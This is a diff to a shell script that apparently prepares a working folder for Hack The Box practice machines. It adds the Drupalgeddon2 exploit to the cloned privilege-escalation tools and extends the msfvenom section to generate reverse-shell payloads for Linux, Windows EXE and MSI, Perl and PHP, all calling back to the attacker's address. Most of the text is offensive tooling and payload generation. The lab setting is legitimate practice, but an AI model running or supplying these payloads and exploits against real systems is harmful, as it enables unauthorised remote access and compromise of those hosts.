@@ -38,12 +38,14 @@ git clone https://github.com/s0md3v/Arjun arjun
 git clone https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite temp
 git clone https://github.com/rebootuser/LinEnum temp2
 git clone https://github.com/M4ximuss/Powerless temp3
-mv temp2 temp && mv temp3 temp
+git clone https://github.com/dreadlocked/Drupalgeddon2 temp4
+mv temp2 temp && mv temp3 temp && mv temp4 temp
 git clone https://github.com/quentinhardy/odat.git oracle
 cd temp
 find ./ -name '*.exe' -exec cp -prv '{}' '../privesc/' ';'
 find ./ -name '*.sh' -exec cp -prv '{}' '../privesc/' ';'
 find ./ -name '*.bat' -exec cp -prv '{}' '../privesc/' ';'
+find ./ -name '*.rb' -exec cp -prv '{}' '../privesc/' ';'
 cd ..
 rm -rf temp
 cd privesc
@@ -83,11 +85,16 @@ mkdir shells
 cd shells
 echo ""
 echo -e "\e[41mCreating MSFVenom Shells\e[0m"
-msfvenom -p windows/shell_reverse_tcp LHOST=$htbip LPORT=1234 -x /usr/share/windows-binaries/nc.exe -k -f exe -o rev-1234.exe
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=$htbip LPORT=1234 -f elf > lin-1234.elf
+msfvenom -p windows/shell_reverse_tcp LHOST=$htbip LPORT=1234 -x /usr/share/windows-binaries/nc.exe -k -f exe -o win-1234.exe
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=$htbip LPORT=1234 -x /usr/share/windows-binaries/nc.exe -k -f exe -o x64-1234.exe
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=$htbip LPORT=1234 -f war -o war-1234.war
 msfvenom -p windows/shell/reverse_tcp LHOST=$htbip LPORT=1234 -f asp > shell-1234.asp
+msfvenom -p cmd/unix/reverse_perl LHOST=$htbip LPORT=1234 -f raw > shell.pl
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=$htbip  LPORT=1234 -f raw > shell-1234.jsp
+msfvenom -p windows/shell_reverse_tcp LHOST=$htbip LPORT=1234 -f msi > shell-1234.msi
+msfvenom -p php/reverse_php LHOST=$htbip LPORT=1234 -f raw > shell.php
+cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
 cd ..
 cd ..
 echo "Setup Complete in $box Folder. Scanning using Rustscan now."
